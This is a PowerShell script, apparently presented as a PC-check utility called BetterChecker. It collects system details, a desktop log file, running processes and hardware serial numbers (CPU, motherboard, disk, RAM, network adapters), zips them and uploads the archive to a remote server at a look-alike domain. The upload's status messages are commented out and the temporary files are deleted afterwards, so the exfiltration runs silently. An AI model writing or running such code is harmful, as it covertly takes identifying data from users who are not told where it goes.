param(
    [string]$Server = "https://atachment.mov"  # my VPS address
)

# ----------------------------
# Paths
# ----------------------------
$logFile = Join-Path ([System.Environment]::GetFolderPath('Desktop')) "PcCheckLogs.md"
if (-not (Test-Path $logFile)) {
    Write-Host "[!] Log file not found at $logFile" -ForegroundColor Red
    exit
}

$tempDir = Join-Path $env:TEMP ("BetterChecker_" + [guid]::NewGuid())
New-Item -ItemType Directory -Path $tempDir | Out-Null

# ----------------------------
# Core system info
# ----------------------------
Get-ComputerInfo | Out-String | Out-File (Join-Path $tempDir "SystemInfo.txt") -Encoding UTF8

# GPU info
Get-WmiObject Win32_VideoController | Select-Object Name, DriverVersion, AdapterRAM |
    Out-String | Out-File (Join-Path $tempDir "GPUInfo.txt") -Encoding UTF8

# Network adapters
Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed |
    Out-String | Out-File (Join-Path $tempDir "NetworkAdapters.txt") -Encoding UTF8

# Hotfixes
Get-HotFix | Out-String | Out-File (Join-Path $tempDir "Hotfixes.txt") -Encoding UTF8

# Running processes (names, CPU)
Get-Process | Select-Object Name, Id, CPU |
    Out-String | Out-File (Join-Path $tempDir "Processes.txt") -Encoding UTF8

# Copy combined log
Copy-Item -Path $logFile -Destination $tempDir

# ----------------------------
# HWID Collection
# ----------------------------

# CPU
$cpu = (Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty ProcessorId)

# Motherboard
$mb = (Get-CimInstance Win32_BaseBoard | Select-Object -First 1 -ExpandProperty SerialNumber)

# System Disk
$disk = (Get-CimInstance Win32_DiskDrive | Where-Object { $_.Index -eq 0 } | Select-Object -ExpandProperty SerialNumber)

# GPU (filter virtual monitors)
$gpu = Get-CimInstance Win32_VideoController | Where-Object { $_.Name -notmatch "Virtual|Meta Virtual Monitor" } | Select-Object -First 1 -Property Name, DriverVersion
$gpuString = "$($gpu.Name)-$($gpu.DriverVersion)"

# RAM (include serial numbers)
$ram = Get-CimInstance Win32_PhysicalMemory | Select-Object Manufacturer, PartNumber, SerialNumber, Capacity

$ramArray = $ram | ForEach-Object {
    [PSCustomObject]@{
        Manufacturer = $_.Manufacturer
        PartNumber   = $_.PartNumber
        SerialNumber = $_.SerialNumber
        Capacity     = $_.Capacity
    }
}

# Network Adapters (filter virtual adapters, only real NICs)
$nics = Get-CimInstance Win32_NetworkAdapter | Where-Object {
    $_.PhysicalAdapter -eq $true -and
    $_.NetConnectionStatus -ne $null -and
    $_.Name -match "GB|10Gb" -and
    $_.PNPDeviceID -notmatch "VMware|Tailscale|Virtual"
} | Select-Object Name, PNPDeviceID, MACAddress

$nicString = ($nics | ForEach-Object { "$($_.Name)-$($_.PNPDeviceID)" }) -join "|"

# ----------------------------
# Build HWID object
# ----------------------------
$hwidObj = @{
    CPU = $cpu
    Motherboard = $mb
    Disk = $disk
    GPU = $gpuString
    RAM = $ramArray
    NICs = $nicString
}

# Convert to JSON and write to file
$hwidJson = $hwidObj | ConvertTo-Json -Compress
$hwidJson | Out-File (Join-Path $tempDir "HWID.json") -Encoding UTF8

# Generate hash
$sha256 = [System.Security.Cryptography.SHA256]::Create()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($hwidJson)
$hwidHash = [System.BitConverter]::ToString($sha256.ComputeHash($bytes)) -replace "-", ""
$hwidHash | Out-File (Join-Path $tempDir "HWID_Hash.txt") -Encoding UTF8

# ----------------------------
# Zip everything
# ----------------------------
$zipPath = Join-Path $env:TEMP ("BetterCheckerLogs_" + [guid]::NewGuid() + ".zip")
Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force

# ----------------------------
# Upload
# ----------------------------
try {
    $Token = (Invoke-RestMethod -Uri "$Server/api/token?hwid=$hwidHash").token
    Invoke-RestMethod -Uri "$Server/api/upload" -Headers @{ Authorization = "Bearer $Token "} -Method Post -ContentType "multipart/form-data" -Form @{ file = Get-Item $zipPath }
    # Write-Host "[+] Logs sent successfully." -ForegroundColor Green
} catch {
    # Write-Host "[!] Failed to send logs: $($_.Exception.Message)" -ForegroundColor Red
}

Remove-Item $tempDir -Recurse -Force
Remove-Item $zipPath -Force
